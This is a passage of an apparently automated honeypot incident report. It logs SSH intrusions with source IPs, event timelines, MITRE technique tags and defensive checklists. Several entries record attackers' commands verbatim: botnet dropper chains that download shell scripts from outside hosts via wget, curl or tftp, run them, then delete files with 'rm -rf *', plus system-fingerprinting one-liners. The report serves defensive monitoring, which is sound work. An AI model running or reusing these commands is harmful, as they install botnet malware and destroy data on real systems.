- [ ] Submit `211.254.212[.]59` to AbuseIPDB if not already reported
- [ ] Block `211.254.212[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8047624cf5a

| Field | Detail |
|---|---|
| **Source IP** | `211.254.212[.]59` |
| **First Seen** | 2026-09-25 12:54 |
| **Last Seen** | 2026-09-25 12:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:54:40` | `cowrie.session.connect` |
| `2026-09-25 12:54:40` | `cowrie.client.version` |
| `2026-09-25 12:54:40` | `cowrie.client.kex` |
| `2026-09-25 12:54:41` | `cowrie.login.success` |
| `2026-09-25 12:54:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.254.212[.]59` to AbuseIPDB if not already reported
- [ ] Block `211.254.212[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76878c03be66

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-25 13:56 |
| **Last Seen** | 2026-09-25 13:56 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 13:56:20` | `cowrie.session.connect` |
| `2026-09-25 13:56:20` | `cowrie.login.success` |
| `2026-09-25 13:56:21` | `cowrie.session.params` |
| `2026-09-25 13:56:22` | `cowrie.command.input` |
| `2026-09-25 13:56:22` | `cowrie.command.input` |
| `2026-09-25 13:56:32` | `cowrie.session.file_download.failed` |
| `2026-09-25 13:56:37` | `cowrie.log.closed` |
| `2026-09-25 13:56:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84fa94516c79

| Field | Detail |
|---|---|
| **Source IP** | `14.162.102[.]43` |
| **First Seen** | 2026-09-25 14:00 |
| **Last Seen** | 2026-09-25 14:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 14:00:32` | `cowrie.session.connect` |
| `2026-09-25 14:00:32` | `cowrie.client.version` |
| `2026-09-25 14:00:33` | `cowrie.client.kex` |
| `2026-09-25 14:00:36` | `cowrie.login.success` |
| `2026-09-25 14:00:36` | `cowrie.direct-tcpip.request` |
| `2026-09-25 14:00:37` | `cowrie.direct-tcpip.ja4` |
| `2026-09-25 14:00:37` | `cowrie.direct-tcpip.data` |
| `2026-09-25 14:00:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.162.102[.]43` to AbuseIPDB if not already reported
- [ ] Block `14.162.102[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b19378ac4b8

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-25 14:04 |
| **Last Seen** | 2026-09-25 14:05 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 14:04:44` | `cowrie.session.connect` |
| `2026-09-25 14:04:44` | `cowrie.login.success` |
| `2026-09-25 14:04:45` | `cowrie.session.params` |
| `2026-09-25 14:04:46` | `cowrie.command.input` |
| `2026-09-25 14:04:46` | `cowrie.command.input` |
| `2026-09-25 14:04:56` | `cowrie.session.file_download.failed` |
| `2026-09-25 14:05:01` | `cowrie.log.closed` |
| `2026-09-25 14:05:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07210c9971ca

| Field | Detail |
|---|---|
| **Source IP** | `160.119.66[.]206` |
| **First Seen** | 2026-09-25 14:12 |
| **Last Seen** | 2026-09-25 14:13 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, linuxshell, system, sh, ls /home; /bin/busybox BOTNET` |
| **Download Attempts** | hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 14:12:48` | `cowrie.session.connect` |
| `2026-09-25 14:12:49` | `cowrie.login.success` |
| `2026-09-25 14:12:49` | `cowrie.session.params` |
| `2026-09-25 14:12:49` | `cowrie.command.input` |
| `2026-09-25 14:12:49` | `cowrie.command.failed` |
| `2026-09-25 14:12:49` | `cowrie.command.input` |
| `2026-09-25 14:12:49` | `cowrie.command.failed` |
| `2026-09-25 14:12:49` | `cowrie.command.input` |
| `2026-09-25 14:12:49` | `cowrie.command.failed` |
| `2026-09-25 14:12:50` | `cowrie.command.input` |
| `2026-09-25 14:12:50` | `cowrie.command.input` |
| `2026-09-25 14:12:50` | `cowrie.command.input` |
| `2026-09-25 14:12:50` | `cowrie.session.file_download` |
| `2026-09-25 14:12:50` | `cowrie.session.file_download` |
| `2026-09-25 14:12:51` | `cowrie.session.file_download` |
| `2026-09-25 14:12:51` | `cowrie.session.file_download.failed` |
| `2026-09-25 14:13:05` | `cowrie.log.closed` |
| `2026-09-25 14:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.66[.]206` to AbuseIPDB if not already reported
- [ ] Block `160.119.66[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8c7f7393a6a

| Field | Detail |
|---|---|
| **Source IP** | `160.119.66[.]206` |
| **First Seen** | 2026-09-25 14:12 |
| **Last Seen** | 2026-09-25 14:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /var 2>/dev/null || cd /dev/shm 2>/dev/null || cd /run 2>/dev/null || cd /root 2>/dev/null || cd /;rm -f kla.sh;wget -O kla.sh hxxp://160.119.66[.]206/bins/kla.sh 2>/dev/null||busybox wget -O kla.sh hxxp://160.119.66[.]206/bins/kla.sh 2>/dev/null||curl -sLo kla.sh hxxp://160.119.66[.]206/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet&` |
| **Download Attempts** | hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 14:12:50` | `cowrie.session.connect` |
| `2026-09-25 14:12:50` | `cowrie.login.success` |
| `2026-09-25 14:12:51` | `cowrie.session.params` |
| `2026-09-25 14:12:51` | `cowrie.command.input` |
| `2026-09-25 14:12:51` | `cowrie.session.file_download` |
| `2026-09-25 14:12:51` | `cowrie.session.file_download` |
| `2026-09-25 14:12:51` | `cowrie.session.file_download` |
| `2026-09-25 14:12:51` | `cowrie.session.file_download.failed` |
| `2026-09-25 14:12:54` | `cowrie.log.closed` |
| `2026-09-25 14:12:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.66[.]206` to AbuseIPDB if not already reported
- [ ] Block `160.119.66[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f967276bb292

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-25 14:24 |
| **Last Seen** | 2026-09-25 14:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 14:24:48` | `cowrie.session.connect` |
| `2026-09-25 14:24:48` | `cowrie.client.version` |
| `2026-09-25 14:24:48` | `cowrie.client.kex` |
| `2026-09-25 14:24:49` | `cowrie.login.success` |
| `2026-09-25 14:24:52` | `cowrie.direct-tcpip.request` |
| `2026-09-25 14:24:53` | `cowrie.direct-tcpip.ja4` |
| `2026-09-25 14:24:53` | `cowrie.direct-tcpip.data` |
| `2026-09-25 14:24:53` | `cowrie.direct-tcpip.request` |
| `2026-09-25 14:24:54` | `cowrie.direct-tcpip.ja4` |
| `2026-09-25 14:24:54` | `cowrie.direct-tcpip.data` |
| `2026-09-25 14:24:54` | `cowrie.direct-tcpip.request` |
| `2026-09-25 14:24:55` | `cowrie.direct-tcpip.ja4` |
| `2026-09-25 14:24:55` | `cowrie.direct-tcpip.data` |
| `2026-09-25 14:24:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-381f311698b1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-25 14:31 |
| **Last Seen** | 2026-09-25 14:31 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 14:31:33` | `cowrie.session.connect` |
| `2026-09-25 14:31:33` | `cowrie.client.version` |
| `2026-09-25 14:31:33` | `cowrie.client.kex` |
| `2026-09-25 14:31:36` | `cowrie.login.success` |
| `2026-09-25 14:31:39` | `cowrie.session.params` |
| `2026-09-25 14:31:39` | `cowrie.command.input` |
| `2026-09-25 14:31:39` | `cowrie.command.input` |
| `2026-09-25 14:31:39` | `cowrie.command.input` |
| `2026-09-25 14:31:39` | `cowrie.command.input` |
| `2026-09-25 14:31:39` | `cowrie.command.input` |
| `2026-09-25 14:31:39` | `cowrie.command.success` |
| `2026-09-25 14:31:39` | `cowrie.command.input` |
| `2026-09-25 14:31:39` | `cowrie.command.input` |
| `2026-09-25 14:31:39` | `cowrie.command.input` |
| `2026-09-25 14:31:39` | `cowrie.command.input` |
| `2026-09-25 14:31:40` | `cowrie.log.closed` |
| `2026-09-25 14:31:42` | `cowrie.session.params` |
| `2026-09-25 14:31:42` | `cowrie.command.input` |
| `2026-09-25 14:31:43` | `cowrie.log.closed` |
| `2026-09-25 14:31:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9799553e019

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-25 14:34 |
| **Last Seen** | 2026-09-25 14:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 14:34:15` | `cowrie.session.connect` |
| `2026-09-25 14:34:15` | `cowrie.client.version` |
| `2026-09-25 14:34:15` | `cowrie.client.kex` |
| `2026-09-25 14:34:18` | `cowrie.login.success` |
| `2026-09-25 14:34:19` | `cowrie.session.params` |
| `2026-09-25 14:34:19` | `cowrie.command.input` |
| `2026-09-25 14:34:19` | `cowrie.command.input` |
| `2026-09-25 14:34:19` | `cowrie.command.input` |
| `2026-09-25 14:34:19` | `cowrie.command.input` |
| `2026-09-25 14:34:19` | `cowrie.command.input` |
| `2026-09-25 14:34:19` | `cowrie.command.success` |
| `2026-09-25 14:34:19` | `cowrie.command.input` |
| `2026-09-25 14:34:19` | `cowrie.command.input` |
| `2026-09-25 14:34:19` | `cowrie.command.input` |
| `2026-09-25 14:34:19` | `cowrie.command.input` |
| `2026-09-25 14:34:20` | `cowrie.log.closed` |
| `2026-09-25 14:34:23` | `cowrie.session.params` |
| `2026-09-25 14:34:23` | `cowrie.command.input` |
| `2026-09-25 14:34:23` | `cowrie.log.closed` |
| `2026-09-25 14:34:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d734db1516f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-25 14:36 |
| **Last Seen** | 2026-09-25 14:37 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 14:36:52` | `cowrie.session.connect` |
| `2026-09-25 14:36:52` | `cowrie.client.version` |
| `2026-09-25 14:36:52` | `cowrie.client.kex` |
| `2026-09-25 14:36:55` | `cowrie.login.success` |
| `2026-09-25 14:36:57` | `cowrie.session.params` |
| `2026-09-25 14:36:57` | `cowrie.command.input` |
| `2026-09-25 14:36:57` | `cowrie.command.input` |
| `2026-09-25 14:36:57` | `cowrie.command.input` |
| `2026-09-25 14:36:57` | `cowrie.command.input` |
| `2026-09-25 14:36:57` | `cowrie.command.input` |
| `2026-09-25 14:36:57` | `cowrie.command.success` |
| `2026-09-25 14:36:57` | `cowrie.command.input` |
| `2026-09-25 14:36:57` | `cowrie.command.input` |
| `2026-09-25 14:36:57` | `cowrie.command.input` |
| `2026-09-25 14:36:57` | `cowrie.command.input` |
| `2026-09-25 14:36:58` | `cowrie.log.closed` |
| `2026-09-25 14:37:00` | `cowrie.session.params` |
| `2026-09-25 14:37:00` | `cowrie.command.input` |
| `2026-09-25 14:37:02` | `cowrie.log.closed` |
| `2026-09-25 14:37:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8a0aca726e3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-25 14:39 |
| **Last Seen** | 2026-09-25 14:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 14:39:29` | `cowrie.session.connect` |
| `2026-09-25 14:39:29` | `cowrie.client.version` |
| `2026-09-25 14:39:29` | `cowrie.client.kex` |
| `2026-09-25 14:39:32` | `cowrie.login.success` |
| `2026-09-25 14:39:33` | `cowrie.session.params` |
| `2026-09-25 14:39:33` | `cowrie.command.input` |
| `2026-09-25 14:39:33` | `cowrie.command.input` |
| `2026-09-25 14:39:33` | `cowrie.command.input` |
| `2026-09-25 14:39:33` | `cowrie.command.input` |
| `2026-09-25 14:39:33` | `cowrie.command.input` |
| `2026-09-25 14:39:33` | `cowrie.command.success` |
| `2026-09-25 14:39:33` | `cowrie.command.input` |
| `2026-09-25 14:39:33` | `cowrie.command.input` |
| `2026-09-25 14:39:33` | `cowrie.command.input` |
| `2026-09-25 14:39:33` | `cowrie.command.input` |
| `2026-09-25 14:39:34` | `cowrie.log.closed` |
| `2026-09-25 14:39:37` | `cowrie.session.params` |
| `2026-09-25 14:39:37` | `cowrie.command.input` |
| `2026-09-25 14:39:38` | `cowrie.log.closed` |
| `2026-09-25 14:39:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2efcf30dbb54

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-25 14:44 |
| **Last Seen** | 2026-09-25 14:45 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 14:44:55` | `cowrie.session.connect` |
| `2026-09-25 14:44:56` | `cowrie.client.version` |
| `2026-09-25 14:44:56` | `cowrie.client.kex` |
| `2026-09-25 14:45:02` | `cowrie.login.success` |
| `2026-09-25 14:45:06` | `cowrie.session.params` |
| `2026-09-25 14:45:06` | `cowrie.command.input` |
| `2026-09-25 14:45:06` | `cowrie.command.input` |
| `2026-09-25 14:45:06` | `cowrie.command.input` |
| `2026-09-25 14:45:06` | `cowrie.command.input` |
| `2026-09-25 14:45:06` | `cowrie.command.input` |
| `2026-09-25 14:45:06` | `cowrie.command.success` |
| `2026-09-25 14:45:06` | `cowrie.command.input` |
| `2026-09-25 14:45:06` | `cowrie.command.input` |
| `2026-09-25 14:45:06` | `cowrie.command.input` |
| `2026-09-25 14:45:06` | `cowrie.command.input` |
| `2026-09-25 14:45:07` | `cowrie.log.closed` |
| `2026-09-25 14:45:08` | `cowrie.session.params` |
| `2026-09-25 14:45:08` | `cowrie.command.input` |
| `2026-09-25 14:45:09` | `cowrie.log.closed` |
| `2026-09-25 14:45:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19ca07c615d4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-25 14:47 |
| **Last Seen** | 2026-09-25 14:47 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 14:47:30` | `cowrie.session.connect` |
| `2026-09-25 14:47:31` | `cowrie.client.version` |
| `2026-09-25 14:47:31` | `cowrie.client.kex` |
| `2026-09-25 14:47:40` | `cowrie.login.success` |
| `2026-09-25 14:47:43` | `cowrie.session.params` |
| `2026-09-25 14:47:43` | `cowrie.command.input` |
| `2026-09-25 14:47:43` | `cowrie.command.input` |
| `2026-09-25 14:47:43` | `cowrie.command.input` |
| `2026-09-25 14:47:43` | `cowrie.command.input` |
| `2026-09-25 14:47:43` | `cowrie.command.input` |
| `2026-09-25 14:47:43` | `cowrie.command.success` |
| `2026-09-25 14:47:43` | `cowrie.command.input` |
| `2026-09-25 14:47:43` | `cowrie.command.input` |
| `2026-09-25 14:47:43` | `cowrie.command.input` |
| `2026-09-25 14:47:43` | `cowrie.command.input` |
| `2026-09-25 14:47:44` | `cowrie.log.closed` |
| `2026-09-25 14:47:45` | `cowrie.session.params` |
| `2026-09-25 14:47:45` | `cowrie.command.input` |
| `2026-09-25 14:47:45` | `cowrie.log.closed` |
| `2026-09-25 14:47:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec97ab63a628

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-25 14:50 |
| **Last Seen** | 2026-09-25 14:50 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 14:50:01` | `cowrie.session.connect` |
| `2026-09-25 14:50:03` | `cowrie.client.version` |
| `2026-09-25 14:50:03` | `cowrie.client.kex` |
| `2026-09-25 14:50:11` | `cowrie.login.success` |
| `2026-09-25 14:50:14` | `cowrie.session.params` |
| `2026-09-25 14:50:14` | `cowrie.command.input` |
| `2026-09-25 14:50:14` | `cowrie.command.input` |
| `2026-09-25 14:50:14` | `cowrie.command.input` |
| `2026-09-25 14:50:14` | `cowrie.command.input` |
| `2026-09-25 14:50:14` | `cowrie.command.input` |
| `2026-09-25 14:50:14` | `cowrie.command.success` |
| `2026-09-25 14:50:14` | `cowrie.command.input` |
| `2026-09-25 14:50:14` | `cowrie.command.input` |
| `2026-09-25 14:50:14` | `cowrie.command.input` |
| `2026-09-25 14:50:14` | `cowrie.command.input` |
| `2026-09-25 14:50:14` | `cowrie.log.closed` |
| `2026-09-25 14:50:15` | `cowrie.session.params` |
| `2026-09-25 14:50:15` | `cowrie.command.input` |
| `2026-09-25 14:50:16` | `cowrie.log.closed` |
